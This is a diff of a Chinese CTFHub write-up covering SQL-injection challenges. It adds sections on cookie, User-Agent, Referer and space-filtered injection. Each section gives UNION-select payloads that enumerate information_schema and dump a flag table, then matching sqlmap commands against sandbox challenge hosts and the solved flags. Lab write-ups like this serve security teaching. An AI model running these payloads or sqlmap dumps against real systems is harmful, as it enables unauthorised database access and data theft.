@@ -30,7 +30,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/3.png)
 
-`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，用以下代码能够查询到指定数据库的表信息：
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：
 
 ```sql
 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
@@ -38,7 +38,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/4.png)
 
-`information_schema.columns`存了表中所有列的信息，`table_name`表的名字和`table_schema`一一对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：
 
 ```sql
 -1 union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"
@@ -74,7 +74,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/2.png)
 
-`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，输入以下代码能够查询到指定数据库的表信息：
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：
 
 ```sql
 -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
@@ -82,7 +82,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/3.png)
 
-`information_schema.columns`存了表中所有列的信息，`table_name`表的名字和`table_schema`一一对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：
 
 ```sql
 -1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
@@ -120,7 +120,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/2.png)
 
-`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，输入以下代码能够查询到指定数据库的表信息：
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：
 
 ```sql
 1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1)
@@ -128,7 +128,7 @@ Web应用开发过程中，为了内容的快速更新，很多开发者使用�
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/3.png)
 
-`information_schema.columns`存了表中所有列的信息，`table_name`表的名字和`table_schema`一一对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：
 
 ```sql
 1 union select updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')  ,0x7e),1)
@@ -248,7 +248,7 @@ sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D 
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/3.png)
 
-`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，输入以下代码能够查询到指定数据库的表信息：
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：
 
 ```sql
 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
@@ -256,7 +256,7 @@ sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D 
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/4.png)
 
-`information_schema.columns`存了表中所有列的信息，`table_name`表的名字和`table_schema`一一对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：
 
 ```sql
 -1 union select 1,group_concat(column_name) from information_schema.columns where table_name="dmyireyrij"
@@ -275,6 +275,317 @@ sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D 
 提交`ctfhub{a251a62c47aa8b3c139cf2e4}`即可。
 
 ![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/7.png)
+
+------
+
+#### Cookie注入
+
+**解法1：**`Burp Suite`
+
+首先用`Burp Suite`抓包`id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F`进行`url`解码结果为`id输入1试试？`。
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/1.png)
+
+`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Cookie`为以下代码可以查询到当前数据库为`sqli`：
+
+```sql
+id=-1 union select 1, database();
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/2.png)
+
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：
+
+```sql
+id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli';
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/3.png)
+
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`gsilsvtvjn`，我们可以去查询该表的列信息：
+
+```sql
+id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='gsilsvtvjn';
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/4.png)
+
+最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：
+
+```sql
+id=-1 union select 1, group_concat(ywcxnnlyfe) from sqli.gsilsvtvjn;
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/5.png)
+
+提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/6.png)
+
+------
+
+**解法2：**`sqlmap`
+
+`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：
+
+```sql
+sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/7.png)
+
+爆破出当前数据库的名字：
+
+```sql
+sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --current-db
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/8.png)
+
+得到数据库名`sqli`后继续爆破表信息：
+
+```sql
+sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/9.png)
+
+知道有个叫`gsilsvtvjn`的表后，可以查看该表的字段信息：
+
+```sql
+sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn --columns
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/10.png)
+
+最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：
+
+```sql
+sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn -C ywcxnnlyfe --dump 
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/11.png)
+
+提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。
+
+------
+
+#### UA注入
+
+**解法1：**`Burp Suite`
+
+`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`User-Agent`为以下代码可以查询到当前数据库为`sqli`：
+
+```sql
+-1 union select 1, database()
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/1.png)
+
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：
+
+```sql
+-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/2.png)
+
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`ulxbfmsgqx`，我们可以去查询该表的列信息：
+
+```sql
+-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='ulxbfmsgqx'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/3.png)
+
+最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：
+
+```sql
+-1 union select 1, group_concat(zpmjyijptn) from sqli.ulxbfmsgqx
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/4.png)
+
+提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/5.png)
+
+------
+
+**解法2：**`sqlmap`
+
+`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：
+
+```bash
+sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --dbs
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/6.png)
+
+爆破出当前数据库的名字：
+
+```bash
+sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --current-db
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/7.png)
+
+得到数据库名`sqli`后继续爆破表信息：
+
+```sql
+sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/8.png)
+
+知道有个叫`ulxbfmsgqx`的表后，可以查看该表的字段信息：
+
+```sql
+sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx --columns
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/9.png)
+
+最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：
+
+```sql
+sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx -C zpmjyijptn --dump
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/10.png)
+
+提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。
+
+
+------
+
+#### Refer注入
+
+**解法1：**`Burp Suite`
+
+`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：
+
+```sql
+-1 union select 1, database()
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/1.png)
+
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：
+
+```sql
+-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/2.png)
+
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`dirxpetuan`，我们可以去查询该表的列信息：
+
+```sql
+-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='dirxpetuan'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/3.png)
+
+最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：
+
+```sql
+-1 union select 1, group_concat(jfsxcgbxrx) from sqli.dirxpetuan
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/4.png)
+
+提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/5.png)
+
+------
+
+**解法2：**`sqlmap`
+
+`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：
+
+```bash
+sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --dbs
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/6.png)
+
+爆破出当前数据库的名字：
+
+```bash
+sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --current-db
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/7.png)
+
+得到数据库名`sqli`后继续爆破表信息：
+
+```bash
+sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/8.png)
+
+知道有个叫`dirxpetuan`的表后，可以查看该表的字段信息：
+
+```bash
+sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan --columns
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/9.png)
+
+最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：
+
+```bash
+sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan -C jfsxcgbxrx --dump
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/10.png)
+
+提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。
+
+------
+
+#### 空格过滤
+
+输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/1.png)
+
+当`sql`中的空格被过滤时可以用`/**/`来代替。`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：
+
+```sql
+-1/**/union/**/select/**/1,database()
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/2.png)
+
+`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：
+
+```sql
+-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/3.png)
+
+`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`nbadikctna`，我们可以去查询该表的列信息：
+
+```bash
+-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='nbadikctna'
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/4.png)
+
+最后输入以下代码根据`vuafekfves`字段可以查询到该字段的数据：
+
+```sql
+-1/**/union/**/select/**/1,group_concat(vuafekfves)/**/from/**/sqli.nbadikctna
+```
+
+![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/5.png)
+
+提交`ctfhub{12917a7f5475c0de901aec7c}`即可。
 
 ------
 
